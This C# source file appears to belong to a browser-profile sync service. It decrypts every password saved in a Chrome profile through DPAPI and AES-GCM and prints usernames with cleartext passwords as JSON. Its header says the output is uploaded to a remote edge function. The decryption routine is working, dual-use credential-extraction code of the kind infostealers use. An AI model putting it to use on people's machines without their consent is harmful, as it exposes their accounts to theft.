// chrome-credential-capture
//
// Reads a Chrome user-profile directory and emits a JSON list of saved
// credentials to stdout. Invoked by the offline-browser-launcher after
// Chrome exits, before the profile is zipped and uploaded.
//
// Usage:
//   chrome-credential-capture.exe "<profileDir>"
//
// Where <profileDir> is a Chrome --user-data-dir value (the parent of
// the "Default" profile folder).
//
// Output (always JSON, never text):
//   { "ok": true,  "credentials": [ ... ] }
//   { "ok": false, "error": "message" }
//
// Security: cleartext passwords appear ONLY on stdout; nothing is written
// to disk. The caller is expected to immediately POST them over TLS to
// the customer-browser-profile edge function and discard them.

using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using Microsoft.Data.Sqlite;

namespace ChromeCredentialCapture;

internal static class Program
{
    private const string DpapiPrefix = "DPAPI";

    private static int Main(string[] args)
    {
        try
        {
            if (args.Length < 1)
                return Fail("missing profile dir argument");

            var profileDir = args[0];
            if (!Directory.Exists(profileDir))
                return Fail($"profile dir not found: {profileDir}");

            var localStatePath = Path.Combine(profileDir, "Local State");
            var loginDataPath  = Path.Combine(profileDir, "Default", "Login Data");
            if (!File.Exists(localStatePath)) return Fail("Local State not found");
            if (!File.Exists(loginDataPath))  return Ok(Array.Empty<Credential>());

            var aesKey = LoadMasterKey(localStatePath);

            // Copy the SQLite file because Chrome may keep it locked.
            var tmp = Path.Combine(Path.GetTempPath(), $"ld-{Guid.NewGuid():N}.db");
            File.Copy(loginDataPath, tmp, overwrite: true);
            try
            {
                var creds = ReadCredentials(tmp, aesKey);
                return Ok(creds);
            }
            finally
            {
                try { File.Delete(tmp); } catch { /* ignore */ }
            }
        }
        catch (Exception ex)
        {
            return Fail(ex.Message);
        }
    }

    /// <summary>
    /// Pulls os_crypt.encrypted_key out of "Local State", strips the
    /// "DPAPI" prefix, and unwraps it with CurrentUser scope DPAPI.
    /// That gives us the AES-256 key Chrome uses for password_value blobs.
    /// </summary>
    private static byte[] LoadMasterKey(string localStatePath)
    {
        using var doc = JsonDocument.Parse(File.ReadAllText(localStatePath));
        if (!doc.RootElement.TryGetProperty("os_crypt", out var osCrypt) ||
            !osCrypt.TryGetProperty("encrypted_key", out var encKeyEl))
            throw new Exception("os_crypt.encrypted_key missing in Local State");

        var encKeyB64 = encKeyEl.GetString() ?? throw new Exception("encrypted_key empty");
        var encKey = Convert.FromBase64String(encKeyB64);

        // First 5 bytes are the literal ASCII "DPAPI".
        if (encKey.Length < 5 || Encoding.ASCII.GetString(encKey, 0, 5) != DpapiPrefix)
            throw new Exception("encrypted_key missing DPAPI prefix");
        var dpapiBlob = new byte[encKey.Length - 5];
        Buffer.BlockCopy(encKey, 5, dpapiBlob, 0, dpapiBlob.Length);

        return ProtectedData.Unprotect(dpapiBlob, null, DataProtectionScope.CurrentUser);
    }

    private static List<Credential> ReadCredentials(string sqlitePath, byte[] aesKey)
    {
        var list = new List<Credential>();
        using var con = new SqliteConnection($"Data Source={sqlitePath};Mode=ReadOnly");
        con.Open();
        using var cmd = con.CreateCommand();
        cmd.CommandText =
            "SELECT origin_url, signon_realm, username_value, password_value " +
            "FROM logins WHERE blacklisted_by_user = 0";
        using var rd = cmd.ExecuteReader();
        while (rd.Read())
        {
            var originUrl   = rd.IsDBNull(0) ? null : rd.GetString(0);
            var signonRealm = rd.IsDBNull(1) ? null : rd.GetString(1);
            var username    = rd.IsDBNull(2) ? null : rd.GetString(2);
            byte[] enc      = rd.IsDBNull(3) ? Array.Empty<byte>() : (byte[])rd.GetValue(3);
            if (enc.Length == 0 || string.IsNullOrEmpty(username)) continue;

            string? password = TryDecrypt(enc, aesKey);
            if (string.IsNullOrEmpty(password)) continue;

            list.Add(new Credential
            {
                origin_url   = originUrl,
                signon_realm = signonRealm,
                username     = username,
                password     = password,
            });
        }
        return list;
    }

    /// <summary>
    /// Chrome ≥ v80 password blobs are: 'v10' || nonce(12) || ciphertext+tag.
    /// Older blobs are raw DPAPI. Try the new format first; fall back to DPAPI.
    /// </summary>
    private static string? TryDecrypt(byte[] blob, byte[] key)
    {
        try
        {
            if (blob.Length > 15 &&
                blob[0] == (byte)'v' && (blob[1] == (byte)'1' || blob[1] == (byte)'2') &&
                (blob[2] == (byte)'0' || blob[2] == (byte)'1'))
            {
                var nonce = new byte[12];
                Buffer.BlockCopy(blob, 3, nonce, 0, 12);
                var tagLen = 16;
                var cipherLen = blob.Length - 3 - 12 - tagLen;
                if (cipherLen <= 0) return null;
                var cipher = new byte[cipherLen];
                var tag    = new byte[tagLen];
                Buffer.BlockCopy(blob, 3 + 12, cipher, 0, cipherLen);
                Buffer.BlockCopy(blob, 3 + 12 + cipherLen, tag, 0, tagLen);
                var plain = new byte[cipherLen];
                using var aes = new AesGcm(key, tagLen);
                aes.Decrypt(nonce, cipher, tag, plain);
                return Encoding.UTF8.GetString(plain);
            }
            // Legacy DPAPI-only blob.
            var dec = ProtectedData.Unprotect(blob, null, DataProtectionScope.CurrentUser);
            return Encoding.UTF8.GetString(dec);
        }
        catch
        {
            return null;
        }
    }

    private static int Ok(IReadOnlyList<Credential> creds)
    {
        var json = JsonSerializer.Serialize(new { ok = true, credentials = creds });
        Console.Out.Write(json);
        return 0;
    }

    private static int Fail(string error)
    {
        var json = JsonSerializer.Serialize(new { ok = false, error });
        Console.Out.Write(json);
        return 1;
    }

    private sealed class Credential
    {
        public string? origin_url   { get; set; }
        public string? signon_realm { get; set; }
        public string? username     { get; set; }
        public string? password     { get; set; }
    }
}
